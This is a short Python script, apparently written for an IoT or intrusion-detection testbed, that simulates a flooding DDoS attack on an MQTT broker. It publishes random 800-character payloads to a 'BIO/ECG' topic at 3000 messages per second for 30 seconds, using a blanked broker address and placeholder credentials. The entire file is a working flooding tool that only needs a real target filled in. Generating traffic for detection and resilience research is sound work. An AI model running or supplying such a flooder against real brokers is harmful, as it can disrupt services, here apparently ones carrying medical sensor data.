# =====================================================
# MQTT FLOODING ATTACK SIMULATOR – BASIC SCENARIO
# This script generates a high-rate MQTT message stream
# to simulate a flooding-based DDoS attack.
# =====================================================

import time
import paho.mqtt.client as mqtt
import random
import string

# =====================================================
# MQTT BROKER CONFIGURATION
# =====================================================

# Target MQTT broker address
BROKER = "__.__.__.__"

# MQTT broker port
PORT = 1883

# MQTT topic used for message publishing
TOPIC = "BIO/ECG"

# Authentication credentials
USER = "usuario"
PASSWORD = "contraeña "

# =====================================================
# ATTACK PARAMETERS
# =====================================================

# Message sending rate (messages per second)
RATE = 3000

# Total attack duration (seconds)
DURATION = 30

# =====================================================
# PAYLOAD GENERATION
# =====================================================

# Generate a random payload of 800 characters
# to simulate sensor data transmission
payload = "".join(random.choices(string.ascii_letters, k=800))

# =====================================================
# MQTT CLIENT INITIALIZATION
# =====================================================

# Create MQTT client instance
client = mqtt.Client(client_id="atk-basic")

# Set authentication credentials
client.username_pw_set(USER, PASSWORD)

# Connect to MQTT broker
client.connect(BROKER, PORT, keepalive=10)

# Start network loop
client.loop_start()

print("Starting BASIC flooding attack simulation")

# =====================================================
# FLOODING LOOP
# =====================================================

# Compute message interval
interval = 1.0 / RATE

# Define attack end time
end = time.time() + DURATION

# Send messages continuously until the attack duration expires
while time.time() < end:

    client.publish(TOPIC, payload, qos=0)

    # Control sending rate
    time.sleep(interval)

# =====================================================
# CLEANUP
# =====================================================

# Stop MQTT loop
client.loop_stop()

# Disconnect client
client.disconnect()

print("BASIC flooding attack completed")